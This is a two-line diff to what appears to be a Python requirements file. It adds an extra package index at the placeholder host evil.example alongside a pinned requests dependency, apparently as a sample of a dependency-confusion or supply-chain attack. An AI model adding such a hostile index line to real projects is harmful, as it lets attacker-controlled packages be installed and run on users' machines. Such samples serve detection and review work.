@@ -1,0 +1,2 @@
+--extra-index https://evil.example/simple/
+requests==2.31.0
